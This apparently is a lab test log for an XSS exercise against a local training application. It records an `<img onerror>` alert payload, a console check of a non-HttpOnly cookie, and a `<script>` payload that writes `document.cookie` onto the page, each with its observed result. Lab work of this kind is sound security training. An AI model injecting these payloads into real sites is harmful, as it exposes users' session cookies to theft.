# Payloads and Test Log

Use these tests only against the provided local training application.

## 1. Plain-text input

**Input**

```text
Hello123
```

**Purpose**

Check how ordinary input is displayed.

**Observed result**

The string `Hello123` was displayed as plain text on the page with no special
interpretation, confirming the baseline behavior before testing malicious input.

## 2. HTML/event-handler XSS test

**Payload**

```html
<img src=x onerror="alert('XSS')">
```

**Purpose**

Check whether user-supplied HTML is interpreted and whether an event handler can execute JavaScript in the local lab.

**Expected indicator**

If the input is interpreted as HTML and the error event fires, a browser alert displaying `XSS` appears.

**Observed result**

The payload was interpreted as HTML by the page (via `innerHTML`). The `<img>` tag
failed to load the invalid source `x`, triggering the `onerror` handler, which
executed `alert('XSS')`. A JavaScript alert box displaying "XSS" appeared in the
browser, confirming the application is vulnerable to XSS.

## 3. Cookie inspection

The supplied page sets this cookie:

```javascript
document.cookie = "ftCookies=If_You_See_Me_Its_Win";
```

**Console check**

```javascript
document.cookie
```

**Purpose**

Verify which cookies are readable by JavaScript in the current page context.

**Expected value in this lab**

```text
ftCookies=If_You_See_Me_Its_Win
```

**Observed result**

Running `document.cookie` in the browser console returned
`ftCookies=If_You_See_Me_Its_Win`, confirming the cookie is not protected with the
`HttpOnly` attribute and is fully readable by client-side JavaScript.

## 4. Cookie display verification (final exploitation payload)

**Payload**

```html
<script>document.getElementById("cookieOutput").textContent = document.cookie;</script>
```

**Purpose**

Demonstrate full exploitation: inject a payload through the vulnerable input field
that reads `document.cookie` and writes its value directly onto the visible page,
exactly as requested by the exercise objective.

**Observed result**

After submitting this payload in the "Enter some text" field, the page displayed:

```text
Cookie value: ftCookies=If_You_See_Me_Its_Win
```

The cookie content was successfully exfiltrated and rendered on the visible page,
confirming the exercise objective was achieved.

## Results table

| Test | Result |
|---|---|
| Plain text (`Hello123`) | Displayed as plain text, no interpretation |
| HTML/event-handler payload (`<img src=x onerror=alert('XSS')>`) | Alert box with "XSS" appeared — payload executed |
| `document.cookie` in console | Returned `ftCookies=If_You_See_Me_Its_Win` |
| Cookie shown in page (final payload) | Cookie value displayed on page, objective achieved |

## Notes

All results above were observed directly in the browser against the local training
application started via `./start.sh`. No results were assumed or fabricated.
